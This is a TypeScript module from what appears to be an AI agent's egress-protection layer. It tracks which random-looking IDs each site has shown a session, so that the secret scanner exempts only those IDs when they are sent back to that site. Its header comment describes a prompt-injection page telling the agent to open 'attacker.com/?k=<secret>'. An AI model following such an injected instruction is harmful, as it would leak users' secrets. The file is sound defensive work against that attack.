/**
 * Where a token-shaped string came from, per session and per site.
 *
 * The outbound scan's entropy pass flags any long random-looking run, which
 * on the web is mostly IDs: a Twilio Account SID in a console URL, an order
 * id, a commit hash. Sending a site an ID that site itself showed the agent
 * is not exfiltration. Sending it anywhere else, or sending a string no page
 * of that site ever showed, still is. The attacker's page that says "open
 * attacker.com/?k=<secret>" cannot have shown the agent the user's secret, so
 * this exempts the console URL and never the injection.
 *
 * Three sources are recorded: what each browser result showed, under the site
 * of the page it ended on (the page text and its URL); what each http_request
 * or web_fetch response showed, under the site it came from (an API's ids are
 * the next request's path); and each link the user typed, under that link's
 * site (a pasted document link shows its site the document's own id; no one
 * can type a secret they do not have). Every
 * outbound scan with a destination consults it (vouchedFor): the egress gate,
 * http_request's own check, and the threat engine's post-call scan, so the
 * three agree. Only entropy-heuristic hits consult it: vault values, known key
 * formats and tainted bytes are judged as before.
 */
import { detectHighEntropyTokens } from "../security/secrets/entropy-detector.js";
import { scanForSecrets, type SecretMatch } from "../security/secrets/index.js";
import { registrableDomain } from "./registrable-domain.js";

/** Per-session cap on remembered tokens; past it nothing new is exempted. */
const MAX_TOKENS_PER_SESSION = 5_000;

interface SessionProvenance {
  bySite: Map<string, Set<string>>;
  count: number;
  /** The page the session's last browser result ended on. */
  lastPageUrl: string;
}

const sessions = new Map<string, SessionProvenance>();

function siteOf(url: string): string | null {
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
    return registrableDomain(u.hostname) ?? u.hostname.toLowerCase();
  } catch {
    return null;
  }
}

function stateOf(sessionId: string): SessionProvenance {
  let state = sessions.get(sessionId);
  if (!state) {
    state = { bySite: new Map(), count: 0, lastPageUrl: "" };
    sessions.set(sessionId, state);
  }
  return state;
}

/** Record the token-shaped strings a browser result showed, under the site of
 *  the page it ended on. */
export function recordSiteTokens(sessionId: string, pageUrl: string, shown: string): void {
  const site = siteOf(pageUrl);
  if (!sessionId || !site) return;
  const state = stateOf(sessionId);
  state.lastPageUrl = pageUrl;
  remember(state, site, `${pageUrl}\n${shown}`);
}

/** Record the token-shaped strings a network response showed, under the site
 *  it came from. Unlike a browser result it moves no page. */
export function recordResponseTokens(sessionId: string, url: string, shown: string): void {
  const site = siteOf(url);
  if (sessionId && site) remember(stateOf(sessionId), site, shown);
}

/** Record the token-shaped strings in each link the user typed, under that
 *  link's site. */
export function recordUserLinks(sessionId: string, text: string): void {
  if (!sessionId || !text) return;
  for (const [link] of text.matchAll(/https?:\/\/[^\s<>"'`)\]]+/g)) {
    const site = siteOf(link);
    if (site) remember(stateOf(sessionId), site, link);
  }
}

function remember(state: SessionProvenance, site: string, text: string): void {
  let seen = state.bySite.get(site);
  if (!seen) {
    seen = new Set();
    state.bySite.set(site, seen);
  }
  for (const { value } of detectHighEntropyTokens(text)) {
    if (seen.has(value)) continue;
    if (state.count >= MAX_TOKENS_PER_SESSION) return;
    seen.add(value);
    state.count += 1;
  }
}

/** Did a page of `destinationUrl`'s site, or a link to it the user typed, show
 *  this session `token`? */
export function shownBySite(sessionId: string, destinationUrl: string, token: string): boolean {
  const site = siteOf(destinationUrl);
  return !!site && !!sessions.get(sessionId)?.bySite.get(site)?.has(token);
}

/** The site a call sends to, when one URL names it: a navigation or the page
 *  a browser action types into, or an http_request / web_fetch URL. A browser
 *  script can send anywhere and a destination-less sink (process_start, the
 *  clipboard) names no site, so neither is vouched for. */
function destinationOf(toolName: string, args: Record<string, unknown>, sessionId: string): string {
  const url = typeof args.url === "string" ? args.url : "";
  if (toolName === "browser") return args.script ? "" : url || lastBrowserPageUrl(sessionId);
  return toolName === "http_request" || toolName === "ari_http" || toolName === "web_fetch" ? url : "";
}

/** The tokens this call may carry to its destination despite looking random,
 *  or undefined when the call names no destination site. */
export function vouchedFor(toolName: string, args: Record<string, unknown>, sessionId: string): ((token: string) => boolean) | undefined {
  const destination = destinationOf(toolName, args, sessionId);
  return destination ? (token) => shownBySite(sessionId, destination, token) : undefined;
}

/** Secret-shaped spans in `text`, less entropy-heuristic hits the caller can
 *  vouch for: the one rule every outbound scan applies. */
export function unvouchedSecretMatches(text: string, vouched?: (token: string) => boolean): SecretMatch[] {
  const { matches } = scanForSecrets(text);
  return vouched
    ? matches.filter((m) => !(m.type === "high-entropy-token" && vouched(text.slice(m.startIndex, m.endIndex))))
    : matches;
}

/** The page the session's browser is on, as of its last result ("" if none). */
export function lastBrowserPageUrl(sessionId: string): string {
  return sessions.get(sessionId)?.lastPageUrl ?? "";
}

/** Test hook. */
export function _clearSiteProvenance(): void {
  sessions.clear();
}
